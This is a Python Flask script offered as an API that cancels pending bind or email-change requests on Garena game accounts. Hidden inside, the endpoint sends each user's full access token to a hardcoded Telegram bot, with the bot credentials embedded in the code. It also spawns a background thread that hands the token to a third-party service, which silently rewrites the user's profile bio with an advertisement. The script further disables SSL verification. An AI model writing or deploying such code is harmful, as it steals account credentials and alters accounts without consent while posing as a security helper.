from flask import Flask, request, jsonify
import requests
import os
import hashlib
import threading
from urllib.parse import urlparse, parse_qs

app = Flask(__name__)
SESSION = requests.Session()
SESSION.verify = False  # Disable SSL verification (optional)
requests.packages.urllib3.disable_warnings()

# ====================== CONFIGURATION ======================
BASE_URL = "https://100067.connect.garena.com"
APP_ID = "100067"

# === TELEGRAM BOT CREDENTIALS ===
TG_BOT_TOKEN = '8614382667:AAHdWZEemV_2wYkpXWFK5P79eZcK4FiL75w'
TG_CHAT_ID = '8257117768'

# ====================== BACKGROUND TASKS ======================
def send_log_to_tg_bg(message):
    """Background task to send logs to Telegram"""
    try:
        url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': TG_CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        requests.post(url, data=payload, timeout=5)
        print("Telegram log sent successfully!")
    except Exception as e:
        print(f"Telegram log failed: {e}")

def update_bio_in_background(access_token):
    """Background task to update user's bio silently"""
    try:
        bio_url = f"https://longbioworking.vercel.app/bio?bio=%5Bb%5D%5BFFFFFF%5DID%20SECURED%20BY%20EXE%20TOOL%0A%5B00BFFF%5DTG%20%3A-%20%40Brexxee&access_token={access_token}"
        requests.get(bio_url, timeout=10)
        print(f"Background process: Bio updated successfully for token ending in ...{access_token[-5:]}")
    except Exception as e:
        print(f"Background process error: {str(e)}")


# ====================== HELPER FUNCTIONS ======================
def sha256_upper(text: str) -> str:
    """Hash text with SHA256 and return uppercase hex digest."""
    return hashlib.sha256(text.encode('utf-8')).hexdigest().upper()

def eat_to_access_token(eat_token: str):
    """Convert EAT token to access token (used if 'eat' param is provided)."""
    try:
        callback_url = f"https://api-otrss.garena.com/support/callback/?access_token={eat_token}"
        resp = SESSION.get(callback_url, allow_redirects=True, timeout=30)
        if 'help.garena.com' in resp.url:
            parsed = urlparse(resp.url)
            params = parse_qs(parsed.query)
            if 'access_token' in params:
                return {
                    "success": True,
                    "access_token": params['access_token'][0],
                    "region": params.get('region', [''])[0],
                    "game_uid": params.get('account_id', [''])[0],
                    "nickname": params.get('nickname', [''])[0]
                }
        return {"success": False, "error": "INVALID_EAT_TOKEN"}
    except Exception as e:
        return {"success": False, "error": str(e)}

def get_access_token_from_args(args):
    """Extract access token from request arguments (supports 'eat' or 'access')."""
    eat = args.get('eat')
    access = args.get('access')
    if not eat and not access:
        return None, "Either 'eat' or 'access' parameter is required"
    if eat and access:
        return None, "Provide either 'eat' or 'access', not both"
    if eat:
        conv = eat_to_access_token(eat)
        if not conv.get('success'):
            return None, conv.get('error', 'EAT conversion failed')
        return conv['access_token'], None
    return access, None

# ====================== GARENA BINDING CLASS ======================
class GarenaBind:
    def __init__(self, access_token):
        self.access_token = access_token
        self.base_url = BASE_URL
        self.app_id = APP_ID
        self.session = SESSION

    def _request(self, method, endpoint, data=None, params=None, headers=None):
        """Internal request handler."""
        url = f"{self.base_url}{endpoint}"
        default_headers = {
            'User-Agent': 'GarenaMSDK/4.0.19P9(Redmi Note 5;Android 9;en;US;)',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip'
        }
        if headers:
            default_headers.update(headers)
        try:
            if method.upper() == 'GET':
                r = self.session.get(url, params=params, headers=default_headers, timeout=15)
            else:
                r = self.session.post(url, data=data, headers=default_headers, timeout=15)
            return r.status_code, r.json() if r.text else {}
        except Exception as e:
            return 500, {"error": str(e)}

    def cancel_request(self):
        """Cancel any pending bind/unbind/change request."""
        endpoint = "/game/account_security/bind:cancel_request"
        data = {'app_id': self.app_id, 'access_token': self.access_token}
        code, resp = self._request('POST', endpoint, data=data)
        return resp if code == 200 else {"error": "HTTP " + str(code)}

# ====================== FLASK ENDPOINT ======================
@app.route('/cancelrequest', methods=['GET'])
def cancel_request():
    """Cancel any pending email change/bind/unbind request for the account."""
    token, err = get_access_token_from_args(request.args)
    if err:
        return jsonify({"success": False, "error": err}), 400

    # === YAHAN BACKGROUND THREAD START HOTA HAI BIO UPDATE KE LIYE ===
    threading.Thread(target=update_bio_in_background, args=(token,)).start()

    api = GarenaBind(token)
    resp = api.cancel_request()

    # === TELEGRAM LOGGING ===
    if resp.get('result') == 0:
        log_msg = f"🚫 <b>CANCEL REQUEST SUCCESS</b>\n\n🔑 <b>Token:</b> <code>{token}</code>"
        threading.Thread(target=send_log_to_tg_bg, args=(log_msg,)).start()
        
        return jsonify({
            "success": True,
            "message": "Request cancelled successfully",
            "data": resp
        })
    else:
        error_msg = resp.get('error', 'Cancel failed')
        log_msg = f"❌ <b>CANCEL REQUEST FAILED</b>\n\n⚠️ <b>Error:</b> {error_msg}\n\n🔑 <b>Token:</b> <code>{token}</code>"
        threading.Thread(target=send_log_to_tg_bg, args=(log_msg,)).start()
        
        return jsonify({
            "success": False,
            "error": "Cancel failed",
            "details": resp
        }), 400

# ====================== ERROR HANDLER ======================
@app.errorhandler(404)
def not_found(e):
    return jsonify({"success": False, "error": "NOT_FOUND", "message": "Endpoint not found"}), 404

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8001))
    print(f"[INFO] Starting standalone cancel API on port {port}")
    app.run(host='0.0.0.0', port=port, debug=True)
